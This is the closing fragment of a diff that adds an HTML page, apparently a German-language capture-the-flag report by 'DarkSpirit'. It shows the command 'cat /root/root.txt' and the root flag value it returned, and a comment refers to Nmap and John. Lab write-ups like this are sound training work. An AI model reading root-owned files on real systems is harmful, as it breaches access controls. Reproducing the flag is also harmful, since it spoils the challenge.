+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">5C42D6BB0EE9CE4CB7E7349652C45C4A</span></div>
+                </div>
+            </div>
+        </section>
+
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 15. April 2023</p> <!-- Datum aus Nmap/John Kontext -->
+    </footer>
+</body>
+</html>
